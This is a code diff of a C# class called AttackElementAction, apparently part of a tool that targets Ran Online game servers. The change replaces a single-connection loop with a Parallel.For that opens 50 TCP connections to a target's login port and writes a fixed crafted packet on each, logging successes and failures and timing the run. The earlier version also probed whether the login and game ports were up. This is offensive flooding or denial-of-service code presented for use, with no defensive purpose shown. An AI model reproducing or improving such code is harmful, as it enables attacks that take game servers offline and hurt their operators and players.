@@ -2,6 +2,7 @@
 using SimpleTCP;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Threading.Tasks;
 
@@ -9,25 +10,25 @@ namespace RanOnlineCore.Action.AttackAction
 {
     public class AttackElementAction : CommandBase<dynamic>
     {
-        private SimpleTcpClient Client { get; set; }
         private byte[] Data { get; set; }
         private List<string> Messages { get; set; }
         private ObjectContext Context { get; set; }
+        private Stopwatch Watch { get; set; }
         protected override void ValidateCore(ObjectContext context)
         {
+            this.Watch = new Stopwatch();
+            this.Watch.Start();
             this.Context = context;
             this.Add("[STARTING...]");
-            this.Client = new SimpleTcpClient();
             this.Messages = new List<string>();
         }
         protected override void OnExecutedCore(ObjectContext context, Result<dynamic> result)
         {
-            this.Add("[END]");
+            this.Add($"[END WITH {this.Watch.ElapsedMilliseconds / 1000}s]");
         }
         protected override void OnExecutingCore(ObjectContext context)
         {
-            this.Client.DataReceived += Client_DataReceived;
-            this.Data = Enumerable.Range(0, 10000).Select(x => Convert.ToByte(255)).ToArray();
+            this.Data = new byte[] { 8, 0, 35, 4, 183, 97, 0, 0 };
 
         }
         private void Add(string key)
@@ -39,64 +40,44 @@ namespace RanOnlineCore.Action.AttackAction
             this.Data = e.Data;
             this.Add("[RECEIVED]");
         }
-        private bool CheckLogin(ObjectContext context)
-        {
-            try
-            {
-                Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
-                return true;
-            }
-            catch (Exception)
-            {
-                return false;
-            }
-        }
-        private bool CheckGame(ObjectContext context)
-        {
-            try
-            {
-                Client.Connect(context.ElementsZO.IP, context.ElementsZO.GamePort);
-                return true;
-            }
-            catch (Exception)
-            {
-                return false;
-            }
-        }
         protected override Result<dynamic> ExecuteCore(ObjectContext context)
         {
             var time = DateTime.Now.AddMinutes(2);
             var current = 4;
-            while (DateTime.Now.Ticks < time.Ticks && current > 0)
+
+            Parallel.For(0, 50, i =>
             {
                 try
                 {
-                    if(Client.TcpClient == null)
+                    SimpleTcpClient Client = new SimpleTcpClient();
+                    Client.DataReceived += Client_DataReceived;
+
+                    if (Client.TcpClient == null)
                     {
+                        this.Add("[CONNECTING...]");
                         Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                     }
                     if (!Client.TcpClient.Connected)
                     {
+                        this.Add("[CONNECTING...]");
+                        Client.DataReceived += Client_DataReceived;
                         Client.Connect(context.ElementsZO.IP, context.ElementsZO.LoginPort);
                     }
                     Client.Write(Data);
                     this.Add("[SUCCESS]");
+                    Client.Disconnect();
                 }
                 catch (Exception ex)
                 {
                     Console.Write(ex.Message);
-                    Client = new SimpleTcpClient();
-                    Client.DataReceived += Client_DataReceived;
-                    current--;
-                    this.Add($"[RETRY]");
+                    this.Add($"[FAILED]");
+                    --current;
                 }
-            }
+            });
             return Success(new
             {
                 name = context.ElementsZO.Name,
-                login_status = this.CheckLogin(context),
-                game_status = this.CheckGame(context),
-                content = this.Messages
+                content = ObjectContext.Messages
             });
         }
     }
